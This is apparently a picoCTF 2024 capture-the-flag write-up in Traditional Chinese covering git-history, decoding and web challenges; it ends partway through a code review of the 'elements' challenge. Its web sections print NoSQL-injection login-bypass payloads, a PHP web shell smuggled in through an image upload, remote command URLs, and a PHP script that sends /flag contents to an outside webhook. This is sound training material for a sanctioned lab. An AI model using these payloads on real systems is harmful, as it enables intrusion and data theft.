---
title: 'picoCTF 2024 writeup'
disqus: hackmd
---

picoCTF 2024 writeup
===

# Table of Contents

[TOC]
# picoCTF
https://play.picoctf.org/events/73/
![image](https://hackmd.io/_uploads/HyPKxcAp6.png)

![image](https://hackmd.io/_uploads/HJhLRley0.png)
![image](https://hackmd.io/_uploads/rkWqRxeJC.png)

# General Skills (10)
![image](https://hackmd.io/_uploads/rkuax90aT.png)
## Time Machine
![image](https://hackmd.io/_uploads/rJUVG90a6.png)

### Time Machine Solution
在解壓縮後的zip路徑:
\drop-in\.git\COMMIT_EDITMSG
![image](https://hackmd.io/_uploads/BkdQMqApT.png)

### Get FLAG
**FLAG: picoCTF{t1m3m@ch1n3_5cde9075}**

## Commitment Issues
![image](https://hackmd.io/_uploads/B1K0zcR6p.png)

### Commitment Issues Solution
● 在refs/heads/master 下看到
![image](https://hackmd.io/_uploads/SkiAX5Cap.png)
```
十六進制字串
a6dca68e4310585eac3b5c9caf0f75967dfe972c
```

● logs/refs\heads/logs/HEAD 看到git log
![image](https://hackmd.io/_uploads/rklOE50pp.png)
```log
0000000000000000000000000000000000000000 e720dc26a1a55405fbdf4d338d465335c439fb3e picoCTF <ops@picoctf.com> 1710018606 +0000	commit (initial): create flag
e720dc26a1a55405fbdf4d338d465335c439fb3e a6dca68e4310585eac3b5c9caf0f75967dfe972c picoCTF <ops@picoctf.com> 1710018606 +0000	commit: remove sensitive info

```
### 1. 查看git log
```command
git log
```
![image](https://hackmd.io/_uploads/SkH8v11Rp.png)
> 可以看到他的編輯紀錄

### 2.1 還原Git 版本
```command
git reset --hard e720dc26a1a55405fbdf4d338d465335c439fb3e
```
![image](https://hackmd.io/_uploads/BJa5vkJR6.png)
  
```command
cat message.txt
```
![image](https://hackmd.io/_uploads/S1s__y1CT.png)


### 2.2 查看Git 詳細資訊
```command
git show
```
![image](https://hackmd.io/_uploads/r1JLO11Aa.png)

### Get FLAG
**FLAG: picoCTF{s@n1t1z3_7246792d}**

## Binary Search
![image](https://hackmd.io/_uploads/rk5o-Qk0a.png)

```command
ssh -p 59360 ctf-player@atlas.picoctf.net
```
![image](https://hackmd.io/_uploads/Hy6TZQJ0a.png)

### Binary Search Solution
guessing_game.sh
```sh=
            #!/bin/bash

            # Generate a random number between 1 and 1000
            target=$(( (RANDOM % 1000) + 1 ))

            echo "Welcome to the Binary Search Game!"
            echo "I'm thinking of a number between 1 and 1000."

            # Trap signals to prevent exiting
            trap 'echo "Exiting is not allowed."' INT
            trap '' SIGQUIT
            trap '' SIGTSTP

            # Limit the player to 10 guesses
            MAX_GUESSES=10
            guess_count=0

            while (( guess_count < MAX_GUESSES )); do
                read -p "Enter your guess: " guess

                if ! [[ "$guess" =~ ^[0-9]+$ ]]; then
                    echo "Please enter a valid number."
                    continue
                fi

                (( guess_count++ ))

                if (( guess < target )); then
                    echo "Higher! Try again."
                elif (( guess > target )); then
                    echo "Lower! Try again."
                else
                    echo "Congratulations! You guessed the correct number: $target"

                    # Retrieve the flag from the metadata file
                    flag=$(cat /challenge/metadata.json | jq -r '.flag')
                    echo "Here's your flag: $flag"
                    exit 0  # Exit with success code
                fi
            done

            # Player has exceeded maximum guesses
            echo "Sorry, you've exceeded the maximum number of guesses."
            exit 1  # Exit with error code to close the connection
      
```
> 猜數字，猜的次數<10

#### 開始猜
![image](https://hackmd.io/_uploads/rJ8wM7kRp.png)
> 猜對了

### Get FLAG
**FLAG: picoCTF{g00d_gu355_3af33d18}**

## dont-you-love-banners
![image](https://hackmd.io/_uploads/S1QgpjkAp.png)

### dont-you-love-banners Solution



# Web Exploitation (7)
![image](https://hackmd.io/_uploads/BJKQ1iCa6.png)

## Bookmarklet
![image](https://hackmd.io/_uploads/rkzHJjAaT.png)
http://titan.picoctf.net:57091/
![image](https://hackmd.io/_uploads/rJCU1iCa6.png)

### Bookmarklet Solution
```javascript=
(function() {
    // 加密的flag
    var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓ¨ÍÕÄ¦í";
    // 解密密鑰
    var key = "picoctf";
    // 初始化一個空字串(存解密後的flag)
    var decryptedFlag = "";
    for (var i = 0; i < encryptedFlag.length; i++) {
        // 使用密鑰解密每個字元
        // 將密鑰的字符代碼（模除密鑰長度）從加密的旗幟的字符代碼中減去
        // 添加 256 以確保得到正數結果，然後取模 256 以處理溢出
        // 將結果的字符代碼轉換回字符並附加到解密後的旗幟字符串中
        decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
    }
    
    alert(decryptedFlag);
})();

```

JavaScript Online Compiler
![image](https://hackmd.io/_uploads/SyQ2Vo0aT.png)

### GET FLAG
**FLAG: picoCTF{p@g3_turn3r_18d2fa20}**

## WebDecode
![image](https://hackmd.io/_uploads/r1zero0ap.png)
http://titan.picoctf.net:60527/
![image](https://hackmd.io/_uploads/HJUWrjAa6.png)

### WebDecode Solution
● ABOUT: http://titan.picoctf.net:60527/about.html
![image](https://hackmd.io/_uploads/S16KBjRTp.png)

● CONTACT: http://titan.picoctf.net:60527/contact.html
![image](https://hackmd.io/_uploads/Hy9sBo0Ta.png)

在ABOUT頁面中:
![image](https://hackmd.io/_uploads/SJCfIsATa.png)
> 出現一個詭異的編碼
> notify_true="cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMTBmOTM3NmZ9"

#### Base64 decode
![image](https://hackmd.io/_uploads/H1aDIi0Ta.png)
### GET FLAG
**FLAG: picoCTF{web_succ3ssfully_d3c0ded_10f9376f}**

## Unminify
![image](https://hackmd.io/_uploads/BkueU2CTp.png)
http://titan.picoctf.net:53048/
![image](https://hackmd.io/_uploads/rJKMI30TT.png)

### Unminify Solution
![image](https://hackmd.io/_uploads/HkGOI20a6.png)
### GET FLAG
**FLAG: picoCTF{pr3tty_c0d3_ed938a7e}**

## IntroToBurp
![image](https://hackmd.io/_uploads/r1qUbgyAT.png)
http://titan.picoctf.net:57361/
![image](https://hackmd.io/_uploads/BypFbl1Rp.png)

### IntroToBurp Solution
#### 1. Register
![image](https://hackmd.io/_uploads/BJ9NqUeRp.png)
```POST
POST / HTTP/1.1
Host: titan.picoctf.net:57361
Content-Length: 188
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:57361
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57361/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=eyJjc3JmX3Rva2VuIjoiZDRkNGY0OWIzNGZlZTE1N2ZjYWZiNzg1MDE5MDlhYzlkNGY4MGU5ZiJ9.ZfFznQ.rwy8ZPK9maIGuieHtAEI2UBZFCs
Connection: close

csrf_token=ImQ0ZDRmNDliMzRmZWUxNTdmY2FmYjc4NTAxOTA5YWM5ZDRmODBlOWYi.ZfFznQ.eUroAAc2CNChLpWbuoq8_ZBCK3g&full_name=chw&username=chw&phone_number=0909&city=taipei&password=chw&submit=Register
```
```GET
GET /dashboard HTTP/1.1
Host: titan.picoctf.net:57361
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:57361/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=.eJxNjM0KwyAQhN_Fcw-GrsTty4g_u0SaqKghlNJ3755KbzPfx8xbxTxf6qGmz42yuqk4OrtZn1SEJkjAgOEOTLSYlaPnsFqjF9ToI4q1mpBlx-e-u-IPklncLiF1NskIYKyR2vwYV-3p59tWC7lyHoG6QC2XQs9B_e_m8wUAfzIB.ZfF0TA.lnPFakYpokwVTkgYfY9SblOyskA
Connection: close
```
> 問題不在這
#### 2. 2fa authentication
http://titan.picoctf.net:65271/dashboard
![image](https://hackmd.io/_uploads/Hy3wIM10p.png)

![image](https://hackmd.io/_uploads/H1DZPfk0a.png)

```POST
POST /dashboard HTTP/1.1
Host: titan.picoctf.net:65271
Content-Length: 10
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://titan.picoctf.net:65271
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://titan.picoctf.net:65271/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=.eJxNzM0KwyAQBOB38dyDa9XUvozoZiWhiQZ_CKH03bu99Tbzwcxb4Nov8RQ9rAet4iaw1eR7eVFmtWAAZowAxumExhk7kcZJgZplCGkio3REy7s0ts3nsBPPcDlZSj84G2WlfXA9QmtnqTMbqPsPlpLJ57FHqozSScc6GtW_m88XdvAwbg.ZfGUow.ViJwEkvW_SJmGF3Kj5eygAII60k
Connection: close

otp=chwchw
```
#### 3. 刪除OTP請求
![image](https://hackmd.io/_uploads/BkB0dz10T.png)

### GET FLAG
**FLAG:picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}**

## No Sql Injection
![image](https://hackmd.io/_uploads/ry2nI3RTa.png)
http://atlas.picoctf.net:61553/
![image](https://hackmd.io/_uploads/Hy0CLhCp6.png)

Source Code:
https://artifacts.picoctf.net/c_atlas/29/app.tar.gz

### No Sql Injection Solution
● 在app/utild/see.ts
![image](https://hackmd.io/_uploads/HkHa23CpT.png)
> 找到可登入的USER

● 在app/api/login/route.ts 找到 /admin
![image](https://hackmd.io/_uploads/ryaPjyyCT.png)

http://atlas.picoctf.net:61553/admin
![image](https://hackmd.io/_uploads/HyI8iJ1AT.png)

● 在app/models/user.ts 找到flag位置

user.ts
```python=10
const UserSchema: Schema = new Schema({
  email: { type: String, required: true, unique: true },
  firstName: { type: String, required: true },
  lastName: { type: String, required: true },
  password: { type: String, required: true },
  token: { type: String, required: false ,default: "{{Flag}}"},
});
const User = models.User || mongoose.model<UserInterface>("User", UserSchema);
```
> FLAG 在User 的token中

### NoSQL injection
> 參考資料:
> [PortSwigger: NoSQL injection](https://portswigger.net/web-security/nosql-injection)
> [NoSQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)

#### 1. 繞過驗證
:::info
Authentication bypass
在 MongoDB 中
$ne: 代表 "not equal"，用於篩選出某個欄位的值不等於指定值的文件（或記錄）。
$gt: 代表 "greater than"，用於篩選出某個欄位的值大於指定值的文件（或記錄）。
:::
```
POST /api/login/ HTTP/1.1
Host: atlas.picoctf.net:61553
Content-Length: 60
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://atlas.picoctf.net:61553
Referer: http://atlas.picoctf.net:61553/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"email":"joshiriya355@mumbama.com","password":{"$ne":  ""}}
```
使用see.ts找到的USER: joshiriya355@mumbama.com
password 不等於 ""(空白)
> 可繞過驗證，進到 /admin
> 沒有幫助

#### 2. \ "繞過特殊字元
" 在MongoDB屬於特殊字元，可用\ bypass
```POST
POST /api/login HTTP/1.1
Host: atlas.picoctf.net:61553
Content-Length: 58
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://atlas.picoctf.net:61553
Referer: http://atlas.picoctf.net:61553/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"email":"{\"$ne\":  \"\"}","password":"{\"$ne\":  \"\"}"}
```
![image](https://hackmd.io/_uploads/B1R51Pe0T.png)
```response
HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Accept-Encoding
content-type: text/plain;charset=UTF-8
date: Thu, 14 Mar 2024 10:19:36 GMT
connection: close
Content-Length: 237

[{"_id":"65f08d5715535af6a1394524","email":"joshiriya355@mumbama.com","firstName":"Josh","lastName":"Iriya","password":"Je80T8M7sUA","token":"cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2UzMWVmMzI0fQ==","__v":0}]
```

### GET FLAG
>cGljb0NURntqQmhEMnk3WG9OelB2XzFZeFM5RXc1cUwwdUk2cGFzcWxfaW5qZWN0aW9uX2UzMWVmMzI0fQ==

(Base64 Decode)
![image](https://hackmd.io/_uploads/rkaEMvgAp.png)

**FLAG:picoCTF{#0TP_Bypvss_SuCc3$S_e1eb16ed}**

## Trickster
![image](https://hackmd.io/_uploads/SkUqBQyA6.png)
http://atlas.picoctf.net:63080/
![image](https://hackmd.io/_uploads/B1airX1Ra.png)
### Trickster Solution
上傳成功只會顯示:
> File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully


● HxD - bypass file signature
png: 89 50 4E 47 0D 0A 1A 0A
jpg: FF D8 FF DB

Note: [[Web] Computer Security 2023 Fall Course](https://hackmd.io/@CHW/ryPzhx0H6#%E9%9A%B1%E5%AF%AB%E8%A1%93-byNISRA) 

#### 1. 嘗試生成pico.png.php並塞入command
```
 echo '<?php system($_GET["cmd"]); ?>' > pico.png.php
```
Upload pico.png.php
```POST
POST / HTTP/1.1
Host: atlas.picoctf.net:57707
Content-Length: 231
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://atlas.picoctf.net:57707
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryt9J5rgW4kHlekX93
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://atlas.picoctf.net:57707/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
------WebKitFormBoundaryt9J5rgW4kHlekX93
Content-Disposition: form-data; name="~~file~~ image_file"; filename="pico.png.php"
Content-Type: application/~~octet-stream~~ image/png
<?php system($_GET["cmd"]); ?>
------WebKitFormBoundaryt9J5rgW4kHlekX93--
```

![image](https://hackmd.io/_uploads/HyDqcF1Ca.png)
> 跳出的Warning，可以得知系統用PHP寫的

#### 2. 透過upload php POST Webhook
```php=
<?php
// 讀取 /flag 文件的内容
$flag_content = file_get_contents('/flag');

// 檢查是否成功讀取 flag
if ($flag_content !== false) {
    $data = array('flag' => $flag_content);
    $url = 'https://webhook.site/b7887e11-230d-4cac-a3e6-372071c3f2d5';

    // 初始化 cURL
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);

    if ($response === false) {
        echo 'Error: ' . curl_error($ch);
    } else {
        echo 'Flag sent successfully!';
        echo 'Server response: ' . $response;
    }

    curl_close($ch);
} else {
    echo 'Failed to read flag file.';
}
?>

```
:question: 可以把png嵌入php上傳，但php無法執行。

#### 3. Dirsearch Tools
```command
dirsearch -u http://atlas.picoctf.net:64632/
```
![image](https://hackmd.io/_uploads/BJhGU5y0a.png)

> 看到 /uploads 路徑 301

#### 4. png 塞入php後門
:::info
常見的上傳檔案格式判斷

(1) HTML顯示 only png，內部沒有過濾
```php
$filename = basename($_FILES['image_file']['name']);
```

(2) 判斷filename
```php
$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);
if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
```

(3)判斷filename & file information
```php
$filename = basename($_FILES['image_file']['name']);
$extension = strtolower(explode(".", $filename)[1]);
if (!in_array($extension, ['png', 'jpeg', 'jpg']) !== false)
使用者上傳檔案時，getimagesize取得圖像檔案的資訊
list($_, $_, $type) = getimagesize($_FILES['image_file']['tmp_name']);
if (in_array($_FILES['image_file']['type'], ["image/png", "image/jpeg", "image/jpg"]) === false)
```
:::
```
exiftool -Comment='<?php system($_GET["cmd"]); ?>' CTF.png
mv CTF.png CTF.png.php
```

![image](https://hackmd.io/_uploads/r1TSs5kAT.png)

(UPLOAD) 更改Content-Type: image/png
![image](https://hackmd.io/_uploads/r1vTkoyRp.png)

http://atlas.picoctf.net:64632/uploads/CTF.png.php

#### 4. RCE & Find flag
```URL
http://atlas.picoctf.net:55476/uploads/CTF.png.php?cmd=ls /
http://atlas.picoctf.net:55476/uploads/CTF.png.php?cmd=find%20/%20-type%20f%20-name%20flag*
```

![image](https://hackmd.io/_uploads/BkquackAT.png)
> 找不到

```URL
http://atlas.picoctf.net:55476/uploads/CTF.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt
```
![image](https://hackmd.io/_uploads/ry7ApqyRa.png)
> 最後在 ../MQZWCYZWGI2WE.txt 找到

### GET FLAG
**FLAG:picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}**

## elements
![image](https://hackmd.io/_uploads/ByY8-s10a.png)
http://rhea.picoctf.net:59823/

![image](https://hackmd.io/_uploads/HJy5bjy0T.png)

### elements Solution
### Code Review
● index.js
```javascript=
// this entire thing is basically a knockoff of infinite craft
// https://neal.fun/infinite-craft/

const onlineHost = 'https://elements.attest.lol'; //主機位址

const buttons = document.getElementById('elements'); //取得來自HTML的elements

// these were all generated by ai, yes they have some really weird results
const recipes = [["Ash","Fire","Charcoal"],["Steam Engine","Water","Vapor"],["Brick Oven","Heat Engine","Oven"],["Steam Engine","Swamp","Sauna"],["Magma","Mud","Obsidian"],["Earth","Mud","Clay"],["Volcano","Water","Volcanic Rock"],["Brick","Fog","Cloud"],["Obsidian","Rain","Black Rain"],["Colorful Pattern","Fire","Rainbow Fire"],["Cloud","Obsidian","Storm"],["Ash","Obsidian","Volcanic Glass"],["Electricity","Haze","Static"],["Fire","Water","Steam"],["Dust","Rainbow","Powder"],["Computer Chip","Steam Engine","Artificial Intelligence"],["Fire","Mud","Brick"],["Hot Spring","Swamp","Sulfur"],["Adobe","Graphic Design","Web Design"],["Colorful Interface","Data","Visualization"],["IoT","Security","Encryption"],["Colorful Pattern","Mosaic","Patterned Design"],["Earth","Steam Engine","Excavator"],["Cloud Computing","Data","Data Mining"],["Earth","Water","Mud"],["Brick","Fire","Brick Oven"],["Colorful Pattern","Obsidian","Art"],["Rain","Steam Engine","Hydropower"],["Colorful Display","Graphic Design","Colorful Interface"],["Fire","Mist","Fog"],["Exploit","Web Design","XSS"],["Computer Chip","Hot Spring","Smart Thermostat"],["Earth","Fire","Magma"],["Air","Earth","Dust"],["Cloud","Rainbow","Rainbow Cloud"],["Dust","Heat Engine","Sand"],["Obsidian","Thunderstorm","Lightning Conductor"],["Cloud","Rain","Thunderstorm"],["Adobe","Cloud","Software"],["Hot Spring","Rainbow","Colorful Steam"],["Dust","Fire","Ash"],["Cement","Swamp","Marsh"],["Hot Tub","Mud","Mud Bath"],["Electricity","Glass","Computer Chip"],["Ceramic","Fire","Earthenware"],["Haze","Swamp","Fog Machine"],["Rain","Rainbow","Colorful Display"],["Brick","Water","Cement"],["Dust","Haze","Sandstorm"],["Ash","Hot Spring","Geothermal Energy"],["Ash Rock","Heat Engine","Mineral"],["Electricity","Software","Program"],["Computer Chip","Fire","Data"],["Colorful Pattern","Swamp","Algae"],["Fog","Water","Rain"],["Rainbow Pool","Reflection","Color Spectrum"],["Artificial Intelligence","Data","Encryption"],["Internet","Smart Thermostat","IoT"],["Cinder","Heat Engine","Ash Rock"],["Brick","Swamp","Mudbrick"],["Computer Chip","Volcano","Data Mining"],["Obsidian","Water","Hot Spring"],["Computer Chip","Thunderstorm","Power Surge"],["Brick","Obsidian","Paving Stone"],["User Input","Visualization","Interactive Design"],["Mist","Mud","Swamp"],["Geolocation","Wall","Map"],["Air","Rock","Internet"],["Computer Chip","Rain","Email"],["Fire","Rainbow","Colorful Flames"],["Hot Spring","Mineral Spring","Healing Water"],["Ceramic","Volcano","Lava Lamp"],["Brick Oven","Wall","Fireplace"],["Glass","Software","Vulnerability"],["Fog","Mud","Sludge"],["Fire","Marsh","S'mores"],["Artificial Intelligence","Data Mining","Machine Learning"],["Ash","Brick","Brick Kiln"],["Fire","Obsidian","Heat Resistant Material"],["Hot Spring","Sludge","Steam Engine"],["Artificial Intelligence","Computer Chip","Smart Device"],["Fire","Steam Engine","Heat Engine"],["Ash","Earth","Cinder"],["Rainbow","Reflection","Refraction"],["Encryption","Software","Cybersecurity"],["Graphic Design","Mosaic","Artwork"],["Colorful Display","Data Mining","Visualization"],["Hot Spring","Water","Mineral Spring"],["Rainbow","Swamp","Reflection"],["Air","Fire","Smoke"],["Program","Smart HVAC System","Smart Thermostat"],["Haze","Obsidian","Blackout"],["Brick","Earth","Wall"],["Heat Engine","Steam Locomotive","Railway Engine"],["Ash","Thunderstorm","Volcanic Lightning"],["Mud","Water","Silt"],["Colorful Pattern","Hot Spring","Rainbow Pool"],["Fire","Sand","Glass"],["Art","Web Design","Graphic Design"],["Internet","Machine Learning","Smart HVAC System"],["Electricity","Power Surge","Overload"],["Colorful Pattern","Computer Chip","Graphic Design"],["Air","Water","Mist"],["Brick Oven","Cement","Concrete"],["Artificial Intelligence","Cloud","Cloud Computing"],["Computer Chip","Earth","Geolocation"],["Color Spectrum","Graphic Design","Colorful Interface"],["Internet","Program","Web Design"],["Computer Chip","Overload","Circuit Failure"],["Data Mining","Geolocation","Location Tracking"],["Heat Engine","Smart Thermostat","Smart HVAC System"],["Brick","Mud","Adobe"],["Cloud","Dust","Rainbow"],["Hot Spring","Obsidian","Hot Tub"],["Steam Engine","Volcano","Geothermal Power Plant"],["Earth","Fog","Haze"],["Brick","Steam Engine","Steam Locomotive"],["Brick","Colorful Pattern","Mosaic"],["Hot Spring","Steam Engine","Electricity"],["Ash","Volcano","Volcanic Ash"],["Electricity","Water","Hydroelectric Power"],["Brick","Rainbow","Colorful Pattern"],["Silt","Volcano","Lava"],["Computer Chip","Software","Program"],["Hot Spring","Thunderstorm","Lightning"],["Ash","Clay","Ceramic"],["Cybersecurity","Vulnerability","Exploit"],["Ash","Heat Engine","Ash Residue"],["Internet","Smart Device","Cloud Computing"],["Magma","Mist","Rock"],["Interactive Design","Program","Smart Device"],["Computer Chip","Electricity","Software"],["Colorful Pattern","Graphic Design","Design Template"],["Fire","Magma","Volcano"],["Earth","Obsidian","Computer Chip"],["Geolocation","Location Tracking","Real-Time Positioning"]];

const elements = new Map([["Sauna","💦"],["Railway Engine","🚂"],["Clay","🎨"],["Geolocation","📍"],["Colorful Steam","💨"],["Sand","🏖️"],["Visualization","📈"],["Heat Engine","🔩"],["Steam Locomotive","🚂"],["Patterned Design","🎨"],["Smoke","💨"],["Brick","🏠"],["Sandstorm","🌪️"],["Hot Tub","🛀"],["Cybersecurity","🔒"],["Lightning","⚡"],["Fireplace","🔥"],["Fog Machine","💨"],["Mud Bath","🛀"],["Earthenware","🍽️"],["Web Design","💻"],["Dust","🌀"],["Design Template","📋"],["Ceramic","🎨"],["Sulfur","💨"],["Algae","🌱"],["Computer Chip","💻"],["Rainbow Pool","🏊‍♀️"],["Internet","💻"],["Thunderstorm","🌩️"],["Cement","🏭"],["Data","📊"],["Oven","🍞"],["Geothermal Energy","🌋"],["Static","💭"],["Brick Oven","🍞"],["Mud","💦"],["Steam","🚂"],["S'mores","🍪"],["Graphic Design","🖋️"],["Art","🎨"],["Geothermal Power Plant","🌋"],["Circuit Failure","💣"],["Earth","🌍"],["Real-Time Positioning","📍"],["Power Surge","💥"],["Smart HVAC System","💻"],["Mosaic","🎨"],["Mudbrick","🏰"],["Smart Device","📱"],	['Security', '🔒'],['User Input', '📱'],["Vulnerability","🚨"],["Ash Residue","💔"],["Rock","🤘"],["Vapor","💨"],["Healing Water","💧"],["Excavator","🚧"],["Map","🗺️"],["Fire","🔥"],["Heat Resistant Material","🔥"],["Mist","💨"],["Air","💨"],["Swamp","🌿"],["Water","💧"],["IoT","📱"],["Hydropower","💧"],["Hydroelectric Power","💧"],["Reflection","💭"],["Volcano","🌋"],["Data Mining","💻"],["Smart Thermostat","💻"],["Storm","🌪️"],["Black Rain","🌩️"],["Rain","🌧"],["Blackout","💔"],["Haze","💨"],["Location Tracking","📍"],["Software","📊"],["Adobe","📢"],["Color Spectrum","🎨"],["Exploit","💰"],["Electricity","💡"],["Silt","🌀"],["Marsh","🐢"],["Glass","🍷"],["Volcanic Glass","🌋"],["Refraction","🔍"],["Colorful Display","🎨"],["Program","📊"],["Fog","🌫️"],["Steam Engine","🚂"],["Lava Lamp","💡"],["Cloud","☁️"],["Mineral Spring","💧"],["XSS","😈"],["Magma","🔥"],["Sludge","💢"],["Overload","😩"],["Mineral","💎"],["Volcanic Lightning","🌋"],["Ash Rock","🔥"],["Ash","🔥"],["Rainbow","🌈"],["Rainbow Cloud","🌈"],["Concrete","🏛️"],["Volcanic Rock","🌋"],["Artificial Intelligence","🤖"],["Powder","💨"],["Colorful Pattern","🎨"],["Cinder","👠"],["Interactive Design","📱"],["Machine Learning","🤖"],["Lightning Conductor","⚡"],["Hot Spring","🛀"],["Colorful Interface","🎨"],["Cloud Computing","💻"],["Rainbow Fire","🔥"],["Charcoal","🔥"],["Encryption","🔒"],["Volcanic Ash","🌋"],["Brick Kiln","🏭"],["Email","📧"],["Obsidian","🔥"],["Wall","🏰"],["Lava","🔥"],["Colorful Flames","🔥"],["Paving Stone","🛠️"],["Artwork","🎨"]]);

const cache = new Map(); //存儲已經查詢過的合成結果，減少重複查詢

let found = new Map([['Fire', '🔥'], ['Water', '💧'], ['Earth', '🌍'], ['Air', '💨']]); 

if (localStorage.getItem('found')) {
	found = new Map(JSON.parse(localStorage.getItem('found')));
} //若玩家找到的elements

let onlineMode = false;

let state = {};

(async () => {
	try {
		await fetch(`${onlineHost}/status`); //GET /status
		onlineMode = localStorage.getItem('online') ?? false;
		document.getElementById('online-enabled').checked = onlineMode;
		document.getElementById('online-enabled').onchange = () => {
			if (localStorage.getItem('online') === null) {
				alert("NOTE: Online mode exists purely for fun and is not part of the challenge solution. You should not attempt to hack the online mode server.\nPlease don't ruin the fun for everyone else by trying to abuse online mode!\nYou and your team WILL be disqualified if you're found to be trying to attack the server in any way.\nYOU HAVE BEEN WARNED!")
			}
			onlineMode = document.getElementById('online-enabled').checked;
			localStorage.setItem('online', onlineMode);
		}
		document.getElementById('online').removeAttribute('hidden');
	} catch(e) {}
})();
//search功能
document.getElementById('search').onkeyup = () => {
	for (const element of document.getElementsByClassName('element')) {
		if (!element.innerText.toLowerCase().includes(document.getElementById('searchbox').value.toLowerCase())) {
			element.setAttribute('hidden', true);
		} else {
			element.removeAttribute('hidden');
		}
	}
}

const evaluate = (...items) => {
	const [a, b] = items.sort();
	for (const [ingredientA, ingredientB, result] of recipes) {
		if (ingredientA === a && ingredientB == b) {
			if (result === 'XSS' && state.xss) {
				eval(state.xss);
			}
			return result;
		}
	}
	return null;
}

const colliding = (elementA, elementB) => {
	const [a, b] = [elementA.getBoundingClientRect(), elementB.getBoundingClientRect()];
	return a.right >= b.left && a.left <= b.right && a.bottom >= b.top && a.top <= b.bottom;
} //檢查elementA與elementB 碰撞

const hash = (...args) => JSON.stringify(args); //生成json字串

.......
```
```javascript=79

	if (url.pathname === '/') {
		res.setHeader('Content-Type', 'text/html');
		return res.end(html);
	} else if (url.pathname === '/index.js') {
		res.setHeader('Content-Type', 'text/javascript');
		return res.end(js);
	} else if (url.pathname === '/remoteCraft') {
		try {
			const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
			assert(typeof xss === 'string');
			assert(xss.length < 300);
			assert(recipe instanceof Array);
			assert(recipe.length < 50);
			for (const step of recipe) {
				assert(step instanceof Array);
				assert(step.length === 2);
				for (const element of step) {
					assert(typeof xss === 'string');
					assert(element.length < 50);
				}
			}
			visit({ recipe, xss });
		} catch(e) {
			console.error(e);
			return res.writeHead(400).end('invalid recipe!');
		}
		return res.end('visiting!');
	}

	return res.writeHead(404).end('not found');
}).listen(8080);

```
> 1.  'xss': 是字串。長度小於 300 個字元。
> 2. 'recipe' 是陣列。長度小於 50 個元素，確認每個步驟是一個長度為 2 的陣列。步驟中的元素長度小於 50 個字元。

● index.mjs
```javascript=
import { createServer } from 'node:http';
import assert from 'node:assert';
import { spawn } from 'node:child_process';
import { mkdir, mkdtemp, writeFile, rm, readFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const sleep = delay => new Promise(res => setTimeout(res, delay));

const html = await readFile('static/index.html', 'utf-8');
